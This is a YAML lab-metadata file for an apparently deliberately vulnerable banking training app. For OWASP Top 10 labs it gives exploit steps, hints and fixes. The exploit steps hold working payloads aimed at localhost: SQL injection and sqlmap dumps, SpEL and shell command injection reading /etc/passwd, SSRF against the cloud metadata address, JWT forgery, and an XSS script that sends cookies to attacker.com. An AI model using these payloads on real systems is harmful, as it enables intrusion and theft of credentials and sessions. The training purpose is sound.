# SecureBank Labs — lab metadata (source of truth for the in-app lab panel)
#
# scripts/sync-labs.py merges this file with the real Java sources to produce
# backend/core/src/main/resources/labs/labs.json. The "Affected Code" tab is
# therefore always the current source, never a stale copy.
#
# Fields:
#   id          - zero-padded lab number, used in the URL /lab/<id>
#   category    - OWASP Top 10 2025 category
#   title       - short lab title
#   severity    - Low | Medium | High
#   objective   - what the trainee is trying to achieve
#   exploit     - ordered list of exploit steps (may contain shell/curl blocks)
#   hint        - nudge, shown on the Hint tab
#   fix         - the remediation, shown on the Fix tab
#   source      - path (relative to backend/) of the vulnerable Java file
#   anchors     - substrings that mark the start/end of the interesting code block

labs:
  - id: 1
    category: A01
    categoryName: Broken Access Control
    title: "IDOR: View Another Customer's Account"
    severity: Low
    objective: >-
      Access account #ACC-1002 (bob's) while authenticated as alice, without
      authorization checks.
    exploit: |
      1. Log in as `alice / password123` and note alice's account id (1) on the dashboard.
      2. Navigate to **My Accounts → Account Detail**. The URL is `/banking/accounts/1`.
      3. Change the URL to `/banking/accounts/2` — bob's full account appears with
         balance and transaction history.
      4. Confirm via the API:

         ```bash
         TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
           -H "Content-Type: application/json" \
           -d '{"username":"alice","password":"password123"}' \
           | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/accounts/2
         ```
    hint: >-
      This lab is FIXED on the `fixed` branch. Compare it with `main` to see the
      original flaw:
      `git diff main fixed -- backend/core/src/main/java/com/securebank/lab/a01/`
    fix: >-
      Compare the account's owner with the caller before returning it. Reject with
      404 rather than 403, so a caller cannot distinguish "exists but not yours"
      from "does not exist":

      ```java
      if (caller == null || !Objects.equals(account.getUserId(), caller.getId())) {
          return ResponseEntity.status(HttpStatus.NOT_FOUND)
                  .body(Map.of("error", "Account not found"));
      }
      ```

      Authorisation must be enforced server-side on every single request.
    source: core/src/main/java/com/securebank/lab/a01/Lab1IdorController.java
    anchors:
      - "Account account = accounts.findById(id).orElse(null);"

  - id: 2
    category: A01
    categoryName: Broken Access Control
    title: "Privilege Escalation: Customer → Admin"
    severity: Medium
    objective: >-
      Call the admin user-management endpoint as a regular customer.
    exploit: |
      1. Log in as alice and capture the JWT token.
      2. Call the admin endpoint directly — the frontend never links to it, but it is
         unprotected:

         ```bash
         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/users
         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/accounts
         ```
      3. Observe the full user list including hashed passwords and email addresses.
    hint: >-
      This lab is FIXED on the `fixed` branch. Compare it with `main` to see the
      original flaw:
      `git diff main fixed -- backend/core/src/main/java/com/securebank/lab/a01/`
    fix: >-
      Check the caller's role before the query runs, so a non-admin is refused
      with 403 and no user row is ever serialised into the response:

      ```java
      ResponseEntity<?> denied = requireAdmin(caller);
      if (denied != null) {
          return denied;
      }
      ```

      with a single helper that every admin endpoint calls:

      ```java
      private ResponseEntity<?> requireAdmin(CurrentUser caller) {
          if (caller == null || !caller.isAdmin()) {
              return ResponseEntity.status(HttpStatus.FORBIDDEN)
                      .body(Map.of("error", "Admin role required"));
          }
          return null;
      }
      ```

      Centralising it matters: a per-endpoint check is exactly the kind of thing
      that gets forgotten when the next admin endpoint is added. In production
      this would be an `@RequireRole("admin")` annotation applied at the method
      level, or a URL-based authorisation ruleset.

      Authentication and authorisation are different questions. The filter answers
      "who are you?"; the role check answers "are you allowed to do this?".
    source: core/src/main/java/com/securebank/lab/a01/Lab2PrivilegeEscalationController.java
    anchors:
      - "public ResponseEntity<?> users()"

  - id: 3
    category: A01
    categoryName: Broken Access Control
    title: "SSRF: Internal Metadata Fetch"
    severity: High
    objective: >-
      Make the server fetch an internal URL that you choose.
    exploit: |
      1. The statement-email feature POSTs to `/api/a01/accounts/statement-email`.
      2. Supply an attacker-controlled callback URL:

         ```bash
         curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
           -H "Authorization: Bearer $TOKEN" \
           -H "Content-Type: application/json" \
           -d '{"account_id": 1, "callback_url": "http://169.254.169.254/latest/meta-data/"}'
         ```
      3. On cloud infrastructure this returns AWS/GCP instance metadata including IAM
         credentials.
      4. On a local Docker network, pivot to the internal report service that is not
         reachable from the internet:

         ```bash
         curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
           -H "Authorization: Bearer $TOKEN" \
           -H "Content-Type: application/json" \
           -d '{"account_id": 1, "callback_url": "http://report:8081/"}'
         ```
    hint: >-
      This lab is FIXED on the `fixed` branch. Compare it with `main` to see the
      original flaw:
      `git diff main fixed -- backend/core/src/main/java/com/securebank/lab/a01/`
    fix: >-
      The URL is validated in three layers before any request is made.

      **Layer 1 - scheme allowlist.** Only `http` and `https` are accepted, so
      `file://`, `gopher://` and `jar:` cannot be used to read local files or
      speak other protocols:

      ```java
      String scheme = uri.getScheme();
      if (scheme == null
              || !(scheme.equalsIgnoreCase("http") || scheme.equalsIgnoreCase("https"))) {
          return notAllowed();
      }
      ```

      **Layer 2 - host allowlist.** Only hosts the application actually needs are
      fetchable:

      ```java
      private static final Set<String> ALLOWED_HOSTS = Set.of("report");
      ```

      **Layer 3 - resolved address check.** The allowlist alone is not enough,
      because a hostname can resolve to an address the attacker controls. So the
      host is resolved and *every* address it resolves to is checked - not just
      the first, or the attacker controls the ordering:

      ```java
      for (InetAddress address : InetAddress.getAllByName(host)) {
          if (isBlocked(address)) {
              return notAllowed();
          }
      }
      ```

      with `isBlocked` covering loopback (`127.0.0.0/8`, `::1`), link-local
      (`169.254.0.0/16` - this is the cloud metadata range), site-local
      (`10/8`, `172.16/12`, `192.168/16`), `0.0.0.0` and IPv6 unique-local
      (`fc00::/7`).

      **And redirects are never followed**, or an allowed host could answer with
      a `302` pointing at an internal address and bypass all of the above:

      ```java
      .followRedirects(HttpClient.Redirect.NEVER)
      ```

      Every rejection returns the same generic message, so the response does not
      reveal whether the guess hit something real.
    source: core/src/main/java/com/securebank/lab/a01/Lab3SsrfController.java
    anchors:
      - "HttpResponse<String> response = client.send("

  - id: 4
    category: A02
    categoryName: Security Misconfiguration
    title: "Debug Mode: Stack Trace Exposes Config"
    severity: Low
    objective: >-
      Trigger an unhandled exception to view the application's internal state.
    exploit: |
      1. Navigate to `http://localhost:8080/api/a02/debug`.
      2. The response contains:
         - the full Python/Java stack trace
         - `application.yml` values including `jwt.secret` and `spring.datasource.url`
         - the installed middleware list
         - local variable values at every frame
      3. Any unhandled error returns the same detail, because
         `server.error.include-stacktrace=always` is set.
      4. Demonstrate how `jwt.secret` can be used to forge a valid session token (Lab 8).
    hint: >-
      This lab is FIXED on the `fixed` branch. Compare it with `main` to see the
      original flaw:
      `git diff main fixed -- backend/core/src/main/java/com/securebank/lab/a02/`
    fix: >-
      Three changes, because the secret leaked from two places.

      **1. The debug endpoint requires the admin role.** It used to be reachable
      without authentication at all:

      ```java
      if (caller == null || !caller.isAdmin()) {
          return ResponseEntity.status(HttpStatus.FORBIDDEN)
                  .body(Map.of("error", "Admin role required"));
      }
      ```

      It also has to come off the auth filter's public-path allowlist, otherwise
      an anonymous caller reaches the controller instead of being turned away by
      the filter.

      **2. The endpoint no longer returns secrets.** `jwt.secret` and the
      datasource credentials are gone from the response entirely. No secret
      should ever travel in an HTTP response - not even to an administrator.

      **3. The global error handler returns nothing sensitive.** This was the
      bigger leak: the handler caught every unhandled exception in the whole
      application, so *any* 500 anywhere handed over the JWT signing secret and
      the full stack trace. It now returns a generic message and a correlation
      id, and logs the detail server-side:

      ```java
      String correlationId = UUID.randomUUID().toString();

      log.error("unhandled exception [{}] on {} {}",
              correlationId, request.getMethod(), request.getRequestURI(), e);

      body.put("error", "Internal server error");
      body.put("correlation_id", correlationId);
      ```

      The correlation id lets a user quote the failure to support without the
      response itself carrying anything sensitive.

      And the framework defaults are tightened as a second layer:

      ```yaml
      server:
        error:
          include-stacktrace: never
          include-message: never
          include-exception: false
      ```
    source: core/src/main/java/com/securebank/lab/a02/Lab4DebugController.java
    anchors:
      - "public ResponseEntity<?> debug()"

  - id: 5
    category: A02
    categoryName: Security Misconfiguration
    title: "Default Admin Credentials"
    severity: Low
    objective: >-
      Log into the admin console with the default credentials.
    exploit: |
      1. Navigate to `http://localhost/admin-console`.
      2. Enter `admin / admin`.
      3. Observe full ORM-backed access: browse all users, accounts and transfers.
      4. Create a new admin user via the UI — this demonstrates persistence.
    hint: >-
      The seed data always ships one admin account. What password does it use?
      Now that the password has been changed, try the old one on both the admin
      console and the main login path - neither accepts it any more.
    fix: >-
      The seeded administrator is flagged must_change_password and is refused by
      both login paths until its password is replaced, so the factory password is
      never a working credential. New administrator accounts can only be created by
      an authenticated administrator, and they are flagged the same way. Provision
      real admin accounts from a secret manager with generated passwords instead.
    source: core/src/main/java/com/securebank/lab/a02/Lab5DefaultAdminController.java
    anchors:
      - "public ResponseEntity<?> login("

  - id: 6
    category: A02
    categoryName: Security Misconfiguration
    title: "Sensitive File Exposure: .env, .git, backup.zip"
    severity: Medium
    objective: >-
      Recover secrets and the full database from files served by the web root.
    exploit: |
      1. Navigate to `http://localhost/.env` — full environment file with fake
         AWS/Stripe credentials.
      2. Navigate to `http://localhost/.git/config` — git remote URL revealing the
         internal code repository.
      3. Navigate to `http://localhost/backup.zip` — downloads a PostgreSQL database
         backup containing all users and transactions.
      4. Inspect the backup:

         ```bash
         unzip backup.zip
         pg_restore -l securebank.dump      # list the tables
         pg_restore -d securebank_restore securebank.dump
         ```
      5. Find the MD5 password hashes — crack them in the next lab.
    hint: >-
      The static resource directory is the web root. What was placed in it?
      Now that the web root is gone, try the same paths again - none of them
      resolves to a file any more.
    fix: >-
      Static assets are served from a dedicated directory that contains nothing
      but assets, and nothing is mapped at `/**` any more, so a file dropped into
      the asset directory is not reachable by default. The explicit `/.env` and
      `/.git/**` resource handlers have been removed, which restores Spring
      Boot's built-in refusal to serve dot-prefixed paths, and the three secret
      paths are no longer on the AuthFilter's public list. The `.env` file is not
      packaged into the artifact at all and is gitignored, the image no longer
      contains a `.git` directory, and the database backup is written to
      `/app/backups` instead of into a served directory.
    source: core/src/main/java/com/securebank/lab/a02/Lab6StaticExposureController.java
    anchors:
      - "public ResponseEntity<?> exposedFiles()"

  - id: 7
    category: A04
    categoryName: Cryptographic Failures
    title: "MD5 Password Hashing: Crack with Hashcat"
    severity: Medium
    objective: >-
      Crack a user's password from their MD5 hash.
    exploit: |
      1. Obtain hashes via the exposed `backup.zip` (Lab 6) or via the crypto API:

         ```bash
         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/hashes
         ```
      2. Save alice's hash to a file:

         ```bash
         echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt
         ```
      3. Crack with hashcat:

         ```bash
         hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
         ```
      4. Result: `password123` in seconds (MD5 + no salt = trivially crackable).
      5. Without hashcat, the in-app cracker does it for you:

         ```bash
         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/crack
         ```
    hint: >-
      `hashcat -m 0` is raw MD5. Why does the absence of a salt matter so much?
    fix: >-
      Use a deliberately slow, salted password hashing function:

      ```java
      String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
      boolean ok = BCrypt.checkpw(password, hash);
      ```

      Never use MD5, SHA-1 or SHA-256 alone for passwords.
    source: core/src/main/java/com/securebank/lab/a04/Lab7CryptoController.java
    anchors:
      - "public ResponseEntity<?> hashes()"

  - id: 8
    category: A04
    categoryName: Cryptographic Failures
    title: "Hardcoded Weak JWT Secret: Forge Admin Token"
    severity: Medium
    objective: >-
      Forge a JWT with an admin role using the hardcoded secret.
    exploit: |
      1. Log in as alice and copy the JWT token.
      2. Decode it at jwt.io — observe `{"role": "customer", "user_id": 1}`.
      3. The secret `"secret"` is visible in the application startup log:

         ```bash
         docker compose logs backend | grep SECRET_KEY
         ```
      4. Forge an admin token:

         ```python
         import jwt
         token = jwt.encode(
             {"user_id": 3, "role": "admin", "username": "admin"},
             "secret", algorithm="HS256")
         print(token)
         ```
      5. Use the forged token:

         ```bash
         curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
         ```
    hint: >-
      The signing key is loaded from a property that is committed to the repository.
    fix: >-
      Generate a cryptographically strong secret and load it only from the environment:

      ```bash
      python3 -c "import secrets; print(secrets.token_hex(32))"
      ```

      Rotate it on a schedule and never log it.
    source: core/src/main/java/com/securebank/core/security/JwtService.java
    anchors:
      - "log.info(\"JWT signing key loaded"

  - id: 9
    category: A04
    categoryName: Cryptographic Failures
    title: "PII in Cleartext API Responses and Logs"
    severity: Low
    objective: >-
      Observe personal and financial data leaving the API in plaintext and landing in
      the application log.
    exploit: |
      1. Authenticate and call the profile endpoint:

         ```bash
         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/profile
         ```
      2. The response includes the full account number, sort code, email, balance and
         full name — in plaintext.
      3. Check the Docker logs to see the same PII written to stdout:

         ```bash
         docker compose logs backend | grep "profile lookup"
         ```
      4. Traffic is intercepted trivially because there is no HTTPS in dev.
    hint: >-
      Compare the JSON response with the log output.
    fix: >-
      Mask sensitive fields in responses (`ACC-****1001`, `20-**-**`). Never log PII.
      Use TLS in transit and apply field-level encryption at rest.
    source: core/src/main/java/com/securebank/lab/a04/Lab9PiiController.java
    anchors:
      - "Map<String, Object> response = Map.of("

  - id: 10
    category: A05
    categoryName: Injection
    title: "SQL Injection: Login Bypass & Data Dump"
    severity: High
    objective: >-
      Bypass authentication and dump the database.
    exploit: |
      **Login bypass**

      1. At the login form, enter:
         - Username: `admin' --`
         - Password: `anything`
      2. The raw SQL becomes
         `SELECT id, username, password_hash, email, role FROM users WHERE username='admin' --' AND password='...'`
      3. The comment skips the password check — login succeeds as admin.

      **Data dump with sqlmap**

      ```bash
      sqlmap -u "http://localhost:8080/api/a05/auth/login" \
        --data='{"username":"test","password":"test"}' \
        --dbms=PostgreSQL --dump --batch
      ```

      **UNION-based dump**

      ```bash
      curl "http://localhost:8080/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--"
      ```
    hint: >-
      The login query is built by string concatenation. What does the `--` comment
      do to the rest of the statement?
    fix: >-
      Use parameterised queries:

      ```java
      PreparedStatement ps = conn.prepareStatement(
          "SELECT id, username, password_hash, email, role FROM users WHERE username = ? AND password_hash = ?");
      ps.setString(1, username);
      ps.setString(2, passwordHash);
      ```

      Never interpolate user input into SQL text.
    source: core/src/main/java/com/securebank/lab/a05/Lab10SqlInjectionController.java
    anchors:
      - "String sql = \"SELECT id, username, password_hash, email, role FROM users WHERE username = '\""

  - id: 11
    category: A05
    categoryName: Injection
    title: "SSTI: SpEL Remote Code Execution via Transaction Remark"
    severity: High
    objective: >-
      Achieve remote code execution through the transaction remark field.
    exploit: |
      1. After making a transfer, add a remark via the API:

         ```bash
         curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
           -H "Authorization: Bearer $TOKEN" \
           -H "Content-Type: application/json" \
           -d '{"remark": "7*7"}'
         ```
      2. The response contains `Remark: 49` — expression evaluation confirmed.
      3. Read a server file:

         ```bash
         curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
           -H "Authorization: Bearer $TOKEN" \
           -H "Content-Type: application/json" \
           -d '{"remark": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"}).toString()"}'
         ```
      4. The full classic chain, using the `StandardEvaluationContext` so that
         `T(...)` type references are available:
         `#{T(java.lang.Runtime).getRuntime().exec('id')}`
    hint: >-
      The remark is evaluated as an expression, not printed as text. Which evaluation
      context is used, and does it allow type references?
    fix: >-
      Never evaluate user input as an expression. If a template is needed, pass the
      user value as a *variable* to a fixed template:

      ```java
      return ResponseEntity.ok("<p>Remark: " + escapeHtml(remark) + "</p>");
      ```
    source: core/src/main/java/com/securebank/lab/a05/Lab11SstiController.java
    anchors:
      - "Expression expression = parser.parseExpression(remark);"

  - id: 12
    category: A05
    categoryName: Injection
    title: "SSTI + OS Command Injection: Report Service"
    severity: High
    objective: >-
      Extract internal config via template injection, then get RCE via command injection.
    exploit: |
      **Template injection**

      ```bash
      curl -X POST http://localhost:8081/api/report/report/generate \
        -H "Content-Type: application/json" \
        -d '{"account_id": "1001", "template": "Secret: ${config.secretKey}"}'

      curl -X POST http://localhost:8081/api/report/report/generate \
        -H "Content-Type: application/json" \
        -d '{"account_id": "1001", "template": "${config.dbPath}"}'
      ```

      **OS command injection**

      ```bash
      curl -X POST http://localhost:8081/api/report/report/date-filter \
        -H "Content-Type: application/json" \
        -d '{"from_date": "2024-01-01", "to_date": "2024-12-31"}'

      curl -X POST http://localhost:8081/api/report/report/date-filter \
        -H "Content-Type: application/json" \
        -d "{\"from_date\": \"2024-01-01' && id && echo '\", \"to_date\": \"2024-12-31\"}"

      curl -X POST http://localhost:8081/api/report/report/date-filter \
        -H "Content-Type: application/json" \
        -d "{\"from_date\": \"2024-01-01' && cat /etc/passwd && echo '\", \"to_date\": \"2024-12-31\"}"
      ```
    hint: >-
      Two separate bugs on one service. The template string comes from the request
      body, and the date is concatenated into a shell command.
    fix: >-
      **Template injection:** never accept a user-supplied template. Render from a
      fixed set of server-side templates with dynamic values passed as model
      attributes.

      **Command injection:** parse and validate the date, then pass values as
      separate arguments rather than through `sh -c`:

      ```java
      LocalDate from = LocalDate.parse(fromDate, DateTimeFormatter.ISO_LOCAL_DATE);
      ProcessBuilder pb = new ProcessBuilder("date", "--from", from.toString());
      ```
    source: report/src/main/java/com/securebank/lab/a05/report/ReportController.java
    anchors:
      - "public ResponseEntity<?> generate("

  - id: 13
    category: A05
    categoryName: Injection
    title: "Stored XSS: Transaction Notes"
    severity: Medium
    objective: >-
      Store an XSS payload that fires for every user viewing the transfers page.
    exploit: |
      1. Log in as alice.
      2. Submit a transfer with a malicious note:

         ```bash
         curl -X POST http://localhost:8080/api/a05/transfers/send \
           -H "Authorization: Bearer $TOKEN" \
           -H "Content-Type: application/json" \
           -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}'
         ```
      3. Navigate to **Transfers** in the banking app — the alert fires immediately.
      4. Log in as bob and navigate to Transfers — the same alert fires for bob too.
      5. Demonstrate cookie theft with a more realistic payload:

         ```html
         <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
         ```
    hint: >-
      The note is stored and later inserted into the page. Look at how the frontend
      renders that field.
    fix: >-
      Sanitise the HTML before rendering it:

      ```jsx
      import DOMPurify from 'dompurify';
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(txn.note) }} />
      ```

      Better still, render the value as plain text and never use
      `dangerouslySetInnerHTML` for user data:

      ```jsx
      <div>{txn.note}</div>
      ```
    source: core/src/main/java/com/securebank/lab/a05/Lab13XssController.java
    anchors:
      - "public ResponseEntity<?> send("

  - id: 14
    category: A06
    categoryName: Insecure Design
    title: "Business Logic: Negative Transfer Amount"
    severity: Medium
    objective: >-
      Create money from nothing by sending a negative transfer.
    exploit: |
      1. Check alice's initial balance (£4,200).
      2. Send a negative transfer from bob to alice:

         ```bash
         curl -X POST http://localhost:8080/api/a06/transfers/ \
           -H "Content-Type: application/json" \
           -d '{"from_account_id": 2, "to_account_id": 1, "amount": -1000}'
         ```
      3. Refresh alice's account — the balance increased to £5,200.
      4. Bob's balance also increased (both sides of a negative transfer increase).
      5. Demonstrate: alice sends `-999999` from her own account to herself →
         unlimited balance.
    hint: >-
      Is the amount checked for sign, or only for type and range?
    fix: >-
      Validate the amount as a strictly positive value at the input boundary:

      ```java
      if (amount == null || amount.signum() <= 0) {
          throw new ValidationException("Amount must be positive");
      }
      ```

      This is an **insecure design** flaw: the rule was simply never considered
      during design, so no single line of code was ever wrong.
    source: core/src/main/java/com/securebank/lab/a06/Lab14BusinessLogicController.java
    anchors:
      - "public ResponseEntity<?> transfer("

  - id: 15
    category: A06
    categoryName: Insecure Design
    title: "Mass Assignment: Self-Promote to Admin"
    severity: Medium
    objective: >-
      Promote a customer account to admin by exploiting an over-permissive request
      binding.
    exploit: |
      1. Log in as alice and get a token.
      2. PATCH the profile endpoint including the `role` field:

         ```bash
         curl -X PATCH http://localhost:8080/api/a06/profile \
           -H "Content-Type: application/json" \
           -H "Authorization: Bearer $TOKEN" \
           -d '{"username": "alice", "email": "alice@bank.com", "role": "admin"}'
         ```
      3. Fetch the profile back and confirm `"role": "admin"`.
      4. Now use admin endpoints — alice has full admin access.
    hint: >-
      Which fields does the request object actually declare? What happens to the
      ones it declares?
    fix: >-
      Make privileged fields read-only, and use separate request types for read and
      write:

      ```java
      public record ProfileUpdateRequest(String username, String email) { }
      ```

      Role changes should be a privileged admin operation, exposed on a separate
      endpoint that requires admin authorisation.
    source: core/src/main/java/com/securebank/lab/a06/Lab15MassAssignmentController.java
    anchors:
      - "public ResponseEntity<?> updateProfile("

  - id: 16
    category: A06
    categoryName: Insecure Design
    title: "Account Enumeration via Error Messages"
    severity: Low
    objective: >-
      Enumerate valid usernames using different error messages.
    exploit: |
      1. Try logging in with a non-existent user:

         ```bash
         curl -X POST http://localhost:8080/api/a06/auth/login/ \
           -H "Content-Type: application/json" \
           -d '{"username": "notauser", "password": "anything"}'
         # {"error": "User not found"}
         ```
      2. Try with a real user:

         ```bash
         curl -X POST http://localhost:8080/api/a06/auth/login/ \
           -H "Content-Type: application/json" \
           -d '{"username": "alice", "password": "wrongpassword"}'
         # {"error": "Incorrect password"}
         ```
      3. Script username enumeration using this difference:

         ```python
         import requests
         wordlist = ["alice", "bob", "admin", "charlie", "dave"]
         for user in wordlist:
             r = requests.post("http://localhost:8080/api/a06/auth/login/",
                               json={"username": user, "password": "x"})
             if "Incorrect password" in r.text:
                 print(f"[+] Valid user: {user}")
         ```
    hint: >-
      Compare the two error responses character by character.
    fix: >-
      Return an identical message for every failure:

      ```java
      return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
      ```

      Equalise the timing too, so that a missing user and a wrong password take the
      same time to answer.
    source: core/src/main/java/com/securebank/lab/a06/Lab16EnumerationController.java
    anchors:
      - "public ResponseEntity<?> login("

  - id: 17
